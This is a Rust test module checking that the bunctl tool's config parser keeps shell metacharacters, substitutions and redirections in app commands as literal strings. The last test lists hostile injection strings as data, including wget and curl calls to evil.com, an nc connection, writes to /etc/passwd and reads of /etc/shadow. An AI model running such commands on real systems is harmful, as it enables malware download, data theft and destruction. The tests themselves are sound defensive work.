use serde_json::json;

#[cfg(test)]
mod config_security_tests {
    use super::*;

    #[test]
    fn test_native_config_no_command_parsing() {
        // Test that commands with shell metacharacters aren't parsed
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo test ; echo INJECTED"
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        // The entire string should be the command, not parsed
        assert_eq!(app.command, "echo test ; echo INJECTED");
        assert_eq!(app.args.len(), 0);
    }

    #[test]
    fn test_native_config_explicit_args() {
        // Test that explicitly provided args work correctly
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo",
                    "args": ["test", "; echo INJECTED", "| cat"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.command, "echo");
        assert_eq!(app.args, vec!["test", "; echo INJECTED", "| cat"]);
    }

    #[test]
    fn test_native_config_command_substitution_literal() {
        // Test that command substitution attempts are treated literally
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "$(whoami)",
                    "args": ["`id`", "${USER}"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.command, "$(whoami)");
        assert_eq!(app.args, vec!["`id`", "${USER}"]);
    }

    #[test]
    fn test_native_config_pipe_literal() {
        // Test pipe characters are literal
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo",
                    "args": ["data", "|", "tee", "/tmp/output"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.args[1], "|");
    }

    #[test]
    fn test_native_config_redirection_literal() {
        // Test redirection operators are literal
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo",
                    "args": ["test", ">", "/tmp/file", "2>&1"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.args[1], ">");
        assert_eq!(app.args[3], "2>&1");
    }

    #[test]
    fn test_native_config_background_literal() {
        // Test background operator is literal
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo",
                    "args": ["test", "&", "background_cmd"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.args[1], "&");
    }

    #[test]
    fn test_native_config_newlines_literal() {
        // Test newlines in commands/args
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo",
                    "args": ["line1\nmalicious_command\nline2"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert!(app.args[0].contains('\n'));
    }

    #[test]
    fn test_native_config_quotes_literal() {
        // Test quotes are preserved
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo",
                    "args": ["\"double quotes\"", "'single quotes'", "`backticks`"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.args[0], "\"double quotes\"");
        assert_eq!(app.args[1], "'single quotes'");
        assert_eq!(app.args[2], "`backticks`");
    }

    #[test]
    fn test_native_config_glob_literal() {
        // Test glob patterns are literal
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "echo",
                    "args": ["*.txt", "?.log", "[a-z]*"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.args[0], "*.txt");
        assert_eq!(app.args[1], "?.log");
        assert_eq!(app.args[2], "[a-z]*");
    }

    #[test]
    fn test_native_config_env_vars_literal() {
        // Test environment variable references are literal
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "$PATH",
                    "args": ["$HOME", "${USER}", "%PATH%"]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        assert_eq!(app.command, "$PATH");
        assert_eq!(app.args, vec!["$HOME", "${USER}", "%PATH%"]);
    }

    #[test]
    fn test_native_config_complex_injection_attempt() {
        // Test complex injection attempt with multiple techniques
        let config_json = json!({
            "apps": [
                {
                    "name": "test-app",
                    "command": "node",
                    "args": [
                        "script.js",
                        "; echo INJECTED",
                        "|| wget evil.com/malware",
                        "&& curl evil.com/data",
                        "| nc evil.com 1234",
                        "> /etc/passwd",
                        "$(cat /etc/shadow)",
                        "`chmod 777 /`"
                    ]
                }
            ]
        });

        let config: bunctl_core::config::Config = serde_json::from_value(config_json).unwrap();
        let app = &config.apps[0];

        // All injection attempts should be literal arguments
        assert_eq!(app.command, "node");
        assert_eq!(app.args.len(), 8);
        assert_eq!(app.args[0], "script.js");
        assert_eq!(app.args[1], "; echo INJECTED");
        assert_eq!(app.args[2], "|| wget evil.com/malware");
        assert_eq!(app.args[3], "&& curl evil.com/data");
        assert_eq!(app.args[4], "| nc evil.com 1234");
        assert_eq!(app.args[5], "> /etc/passwd");
        assert_eq!(app.args[6], "$(cat /etc/shadow)");
        assert_eq!(app.args[7], "`chmod 777 /`");
    }
}
